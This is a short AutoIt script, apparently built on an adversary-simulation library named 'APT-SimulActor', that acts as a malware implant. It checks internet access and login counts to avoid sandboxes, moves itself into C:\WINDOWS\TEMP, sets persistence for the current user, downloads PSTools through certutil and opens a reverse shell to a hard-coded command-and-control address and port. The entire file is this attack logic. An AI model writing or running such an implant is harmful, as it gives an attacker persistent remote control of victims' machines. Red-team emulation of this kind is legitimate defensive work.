#include <APT-SimulActor.au3>

$c2_ip = "192.168.231.106"
$c2_port = "444"

init()

if InternetCheck() Then

   If numberOfLogins(whoami()) > 2 Then

	  if isRunningFromFolder("C:\WINDOWS\TEMP") Then

		 SetPersistent4CurrentUser()

		 CertUtilDownloader($PSTools_URL)

		 ReverseShell($c2_ip, $c2_port)

	  Else

		 MoveAndRunAgain("C:\WINDOWS\TEMP")

	  EndIf

   EndIf

EndIf